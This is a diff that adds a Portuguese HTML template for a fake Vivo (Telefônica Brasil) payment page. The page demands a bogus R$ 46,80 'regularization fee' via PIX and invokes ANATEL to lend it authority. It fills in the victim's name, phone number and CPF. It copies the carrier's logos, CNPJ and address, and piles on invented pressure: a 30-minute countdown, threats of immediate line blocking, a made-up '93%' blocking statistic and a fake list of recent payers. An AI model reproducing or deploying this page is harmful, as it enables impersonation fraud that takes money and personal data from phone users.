@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="pt-BR" style="height: 100%;">
+<head>
+{% include 'pagamento_head.html' %}
+    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
+    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento PIX - Vivo</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Vivo Fonts -->
+    <style>
+        @font-face {
+            font-family: 'VivoType';
+            src: url('/static/fonts/VivoTypeRegular.woff2') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('/static/fonts/VivoTypeBold.woff2') format('woff2');
+            font-weight: bold;
+            font-style: normal;
+            font-display: swap;
+        }
+        
+        @font-face {
+            font-family: 'VivoType';
+            src: url('/static/fonts/VivoTypeLight.woff2') format('woff2');
+            font-weight: 300;
+            font-style: normal;
+            font-display: swap;
+        }
+    </style>
+    
+    <!-- Fallback Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/static/css/style.css">
+    
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" type="image/png">
+    
+    <style>
+        html, body {
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .pix-container {
+            background-color: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .qr-code-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .pix-code-container {
+            background-color: #660099;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            word-break: break-all;
+            max-height: 120px;
+            overflow-y: auto;
+        }
+        
+        .copy-button {
+            background-color: #660099;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        
+        .copy-button:hover {
+            background-color: #4b0082;
+        }
+        
+        .tax-info {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+        }
+        
+        .tax-value {
+            font-weight: bold;
+            color: #660099;
+        }
+        
+        main {
+            flex: 1 0 auto;
+        }
+        
+        footer {
+            flex-shrink: 0;
+        }
+    </style>
+</head>
+<body style="min-height: 100vh;">
+    <!-- Header -->
+    <header class="vivo-header">
+        <div class="container">
+            <div class="row align-items-center py-3">
+                <div class="col-6">
+                    <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="vivo-logo">
+                </div>
+                <div class="col-6 text-end">
+                    <a href="#" class="text-white mx-2"><i class="fas fa-user fs-4"></i></a>
+                    <a href="#" class="text-white position-relative mx-2">
+                        <i class="fas fa-bell fs-4"></i>
+                        <span class="position-absolute top-0 start-100 translate-middle badge rounded-pill bg-danger">
+                            1
+                        </span>
+                    </a>
+                    <a href="#" class="btn btn-link text-decoration-none d-none d-md-inline-block ms-3">Minha Vivo</a>
+                    <a href="#" class="btn btn-outline-light rounded-pill btn-sm d-none d-md-inline-block">Ajuda</a>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Breadcrumbs -->
+    <div class="container py-1" style="border-bottom: 1px solid #eee;">
+        <div>
+            <span style="font-size: 11px; color: #888;">INÍCIO &gt; PENDÊNCIA CADASTRAL &gt; {{ telefone }}</span>
+        </div>
+    </div>
+    
+    <!-- Banner -->
+    <div class="container-fluid p-0 mb-4 mt-3">
+        <img src="https://vivo.com.br/content/dam/vivo-sites/vivo-com-br/homepage/imagens/header/vivo-bloqueio-linha-1920x420.svg" alt="Vivo Banner" style="width: 100%; height: auto;">
+    </div>
+
+    <!-- Main Content -->
+    <main class="container my-4">
+        <div class="row">
+            <div class="col-lg-8 mx-auto" style="padding: 0 30px;">
+                <h2 class="vivo-title mb-3" style="font-size: 28px;">Pagamento da Taxa de Regularização</h2>
+                
+                <p style="font-size: 15px; color: #666666;">
+                    Prezado(a) Sr. {{ nome }}, para regularizar a linha <span style="color: inherit">{{ telefone }}</span> conforme 
+                    exigências da ANATEL (Resolução nº 477/2007), é necessário realizar o pagamento da taxa de regularização no valor de <span class="tax-value">R$ 46,80</span>.
+                </p>
+                
+                <div class="alert alert-info">
+                    <div class="text-center mb-3">
+                        <img src="https://logospng.org/download/pix/logo-pix-icone-1024.png" alt="Logo PIX" style="height: 60px;">
+                    </div>
+                    <h4 class="text-center mb-3">Pagamento via PIX</h4>
+                    <p class="text-center">
+                        <i class="fas fa-info-circle me-2"></i>
+                        Utilize o QR Code ou código PIX abaixo para efetuar o pagamento. O código é válido por 30 minutos.
+                    </p>
+                </div>
+                
+                <div class="pix-container">
+                    
+                    <div class="qr-code-container">
+                        <img src="{{ pix_qr_code }}" alt="QR Code PIX" class="img-fluid" style="max-width: 200px;">
+                    </div>
+                    
+                    <p class="text-center mb-3">ou</p>
+                    
+                    <h5 class="mb-2">Código PIX para cópia:</h5>
+                    <div class="pix-code-container">
+                        <i class="fas fa-credit-card me-2"></i>
+                        <span id="pix-code">{{ pix_code }}</span>
+                    </div>
+                    
+                    <div class="mb-2 text-center">
+                        <span class="d-inline-block mb-1" style="color: #dc3545; font-weight: bold; animation: pulse 1.5s infinite;">REGULARIZE AGORA! TEMPO ESGOTANDO!</span>
+                    </div>
+                    <button class="copy-button" onclick="copyPixCode()" style="background-color: #ff5722; border-color: #ff5722; font-size: 18px; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.2); animation: pulse 1.5s infinite;">
+                        <i class="fas fa-copy me-2"></i> COPIAR CÓDIGO PIX
+                    </button>
+                    
+                    <style>
+                        @keyframes pulse {
+                            0% {
+                                transform: scale(1);
+                            }
+                            50% {
+                                transform: scale(1.05);
+                            }
+                            100% {
+                                transform: scale(1);
+                            }
+                        }
+                    </style>
+                    
+                    <div class="tax-info mt-4">
+                        <p><strong>Taxa de Regularização Cadastral ANATEL</strong></p>
+                        <p>Valor: <span class="tax-value">R$ 46,80</span></p>
+                        <p>Linha: {{ telefone }}</p>
+                        <p>CPF: {{ cpf }}</p>
+                    </div>
+                </div>
+                
+                <!-- Alertas de urgência -->
+                <div class="alert alert-danger mt-4" style="border-left: 5px solid #dc3545;">
+                    <div class="d-flex align-items-center mb-2">
+                        <i class="fas fa-exclamation-circle me-2" style="font-size: 24px; color: #dc3545;"></i>
+                        <h5 class="mb-0" style="color: #dc3545; font-weight: bold;">ATENÇÃO: PRAZO CRÍTICO!</h5>
+                    </div>
+                    <p style="font-size: 16px; font-weight: 500; line-height: 1.5;">
+                        Sr(a). <strong>{{ nome }}</strong>, seu tempo está se esgotando! O pagamento deve ser realizado em <strong style="color: #dc3545; font-size: 18px;">30 MINUTOS</strong> ou sua linha será bloqueada <span style="background-color: #ffeb3b; color: #000; padding: 0px 5px;">IMEDIATAMENTE</span>.
+                    </p>
+                    <p style="font-size: 16px; font-weight: 500; line-height: 1.5;">
+                        Já temos <strong>93% de bloqueios confirmados</strong> para números com pendências similares ao seu. Evite ficar sem:
+                    </p>
+                    <ul style="font-size: 16px; font-weight: 500; line-height: 1.5;">
+                        <li><i class="fab fa-whatsapp me-2"></i> <strong>WhatsApp</strong> - Perda de todas as conversas e grupos</li>
+                        <li><i class="fas fa-money-bill-wave me-2"></i> <strong>PIX</strong> - Bloqueio de chaves vinculadas ao número</li>
+                        <li><i class="fas fa-lock me-2"></i> <strong>Autenticação</strong> - Perda de acesso a contas bancárias e apps</li>
+                        <li><i class="fas fa-mobile-alt me-2"></i> <strong>Ligações</strong> - Impossibilidade de receber ou fazer chamadas</li>
+                    </ul>
+                    <div class="text-center mt-3 p-2" style="background-color: #f8d7da; border-radius: 5px;">
+                        <span style="font-weight: bold; font-size: 17px;">Prazo final:</span> <span id="countdown" style="color: #dc3545; font-weight: bold; font-size: 18px;">30:00</span> minutos
+                    </div>
+                </div>
+                
+                <script>
+                    // Contador regressivo
+                    document.addEventListener('DOMContentLoaded', function() {
+                        var seconds = 1800; // 30 minutos
+                        var countdownElement = document.getElementById('countdown');
+                        
+                        function updateCountdown() {
+                            var minutes = Math.floor(seconds / 60);
+                            var remainingSeconds = seconds % 60;
+                            
+                            countdownElement.textContent = minutes + ':' + (remainingSeconds < 10 ? '0' : '') + remainingSeconds;
+                            
+                            if (seconds <= 0) {
+                                clearInterval(countdownInterval);
+                                countdownElement.textContent = '00:00';
+                            } else {
+                                seconds--;
+                            }
+                        }
+                        
+                        var countdownInterval = setInterval(updateCountdown, 1000);
+                        updateCountdown();
+                    });
+                </script>
+                
+                <!-- Aviso de usuários que acabaram de pagar -->
+                <div class="alert alert-success mt-4" style="background-color: #e8f5e9; border-color: #c8e6c9; color: #3d8b40; border-radius: 5px;">
+                    <div class="d-flex align-items-center mb-2">
+                        <i class="fas fa-check-circle me-2" style="font-size: 20px;"></i>
+                        <h6 class="mb-0 fw-bold">Usuários regularizados nos últimos minutos:</h6>
+                    </div>
+                    <ul class="mb-0 ps-4" style="font-size: 14px;">
+                        <li><span style="font-weight: 500;">(11) 9****-1528</span> - há 2 minutos</li>
+                        <li><span style="font-weight: 500;">(48) 9****-7912</span> - há 5 minutos</li>
+                        <li><span style="font-weight: 500;">(21) 9****-3465</span> - há 7 minutos</li>
+                    </ul>
+                </div>
+                
+                <div class="mt-4">
+                    <p style="font-size: 15px; color: #666666;">
+                        Após a confirmação do pagamento, sua linha será desbloqueada automaticamente 
+                        em até 10 minutos. Em caso de dúvidas, entre em contato com nosso suporte.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="vivo-footer mt-5">
+        <div class="container py-5">
+            <div class="row">
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <img src="https://www.commshop.com.br/vivo-fibra/assets/apps/Vivo-roxo.png" alt="Vivo" class="mb-3" style="filter: brightness(0) invert(1); width: 80px;">
+                    <p class="text-white-50 small">Telefônica Brasil S.A.<br>CNPJ: 02.558.157/0001-62</p>
+                    <p class="text-white-50 small">Central de Atendimento: 1058<br>www.vivo.com.br</p>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="text-white mb-3">Suporte</h5>
+                    <ul class="list-unstyled footer-links">
+                        <li><a href="#">Minha Conta</a></li>
+                        <li><a href="#">2ª Via de Conta</a></li>
+                        <li><a href="#">Cobertura</a></li>
+                        <li><a href="#">Desbloqueio</a></li>
+                        <li><a href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3 mb-4 mb-md-0">
+                    <h5 class="text-white mb-3">Institucional</h5>
+                    <ul class="list-unstyled footer-links">
+                        <li><a href="#">Sobre a Vivo</a></li>
+                        <li><a href="#">Sustentabilidade</a></li>
+                        <li><a href="#">Trabalhe Conosco</a></li>
+                        <li><a href="#">Para Empresas</a></li>
+                        <li><a href="#">Privacidade</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h5 class="text-white mb-3">Redes Sociais</h5>
+                    <div class="social-icons">
+                        <a href="#" class="me-2"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="me-2"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="me-2"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="me-2"><i class="fab fa-youtube"></i></a>
+                        <a href="#"><i class="fab fa-linkedin-in"></i></a>
+                    </div>
+                    <div class="mt-4">
+                        <p class="text-white mb-1">Baixe o App</p>
+                        <div class="app-badges">
+                            <a href="#" class="me-2"><i class="fab fa-apple"></i> App Store</a>
+                            <a href="#"><i class="fab fa-google-play"></i> Google Play</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <hr class="mt-4 mb-3 border-light">
+            <div class="row">
+                <div class="col-12 text-center text-white-50 small">
+                    <p class="mb-1">© 2025 Telefônica Brasil S.A. Todos os direitos reservados.</p>
+                    <p class="mb-0">CNPJ: 02.558.157/0001-62 | Endereço: Av. Eng. Luiz Carlos Berrini, 1376 - São Paulo - SP - 04571-936</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- Script para copiar o código PIX -->
+    <script>
+        function copyPixCode() {
+            var pixCode = document.getElementById('pix-code').textContent;
+            
+            // Criar um elemento temporário de texto para copiar
+            var tempInput = document.createElement('textarea');
+            tempInput.value = pixCode;
+            document.body.appendChild(tempInput);
+            
+            // Selecionar e copiar o texto
+            tempInput.select();
+            document.execCommand('copy');
+            
+            // Remover o elemento temporário
+            document.body.removeChild(tempInput);
+            
+            // Alterar o texto do botão temporariamente
+            var button = document.querySelector('.copy-button');
+            var originalText = button.textContent;
+            button.textContent = 'CÓDIGO COPIADO!';
+            
+            // Restaurar o texto original após 2 segundos
+            setTimeout(function() {
+                button.textContent = originalText;
+            }, 2000);
+        }
+
+        // Função para redirecionar preservando os parâmetros da URL
+        function redirectWithParams(nextPage) {
+            // Obter os parâmetros atuais da URL
+            const currentParams = new URLSearchParams(window.location.search);
+            
+            // Construir a nova URL com os parâmetros
+            const newUrl = `${nextPage}?${currentParams.toString()}`;
+            
+            // Redirecionar para a nova página
+            window.location.href = newUrl;
+        }
+    </script>
+</body>
+</html>
